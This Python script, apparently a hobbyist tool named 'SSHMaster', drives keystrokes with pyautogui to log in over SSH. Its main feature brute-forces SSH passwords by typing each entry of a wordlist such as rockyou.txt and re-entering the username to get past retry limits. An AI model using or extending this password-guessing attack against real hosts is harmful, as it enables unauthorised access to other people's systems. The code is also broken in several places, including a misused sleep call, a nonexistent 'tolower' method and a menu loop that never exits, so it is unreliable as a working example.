import pyautogui as pg
import color
from time import sleep as t
import getpass

#ok plan is, make normal SSH, brute force SSH

def sshcnct(username, password):
    print(color.progress("Connecting SSH..."))
    pg.typewrite(username)
    pg.press('enter')
    t.sleep(3)
    pg.typewrite(password)
    
def sshbrute(username, wordlist):
	#pg type spam pass
    if wordlist.tolower() == "rockyou.txt":
            wordlist = 'wordlists/rockyou.txt'
        
    with open(wordlist, 'r', encoding='latin-1') as file:
        passwords = file.read().splitlines()
    passReset = 0 #init passreset varaible (ssh resets after 3 )
    pg.typewrite(username)
    pg.press('enter')
    for password in passwords:
        if passReset == 3:
            passReset = 0
            pg.typewrite(username)
            pg.press('enter')
            pg.typewrite(password)
        else:
            passReset +=1
            pg.typewrite(password)
            pg.press('enter')
        







def sshmastercli():
    print("Welcome to SSHMaster! Please select an option below:")
    option = input("""
    - Connect SSH (cn)
    - Brute force SSH (bf) 
    """)

    while True:
        if option.lower() == "cn" or option.lower() == "connect":
            username = input(color.warning("Enter the username and IP in the format \"192.168.1.1@username\": "))
            password = getpass.getpass(color.warning(prompt='Enter your password: '))
            sshcnct(username, password)

        if option.lower() == "bf" or option.lower() == "brute":
            username = input(color.warning("Enter the username and IP in the format \"192.168.1.1@username\""))
            wordlist = input(color.progress("Please select a wordlist or provide a wordlist filepath: \n-rockyou.txt (ry)\n-"))
            sshbrute(username, wordlist)

        if option.lower() == "..":
            break




def sshmastergui():
    username = pg.prompt(text='Please enter username', title='SSHMaster GUI: Please enter username', default='127.0.0.1')
    password = pg.password(text='Please enter password', title='SSHMaster GUI: Please enter password', default='')
    pg.typewrite("ssh " + username)
    pg.press('enter')
#sshmastergui()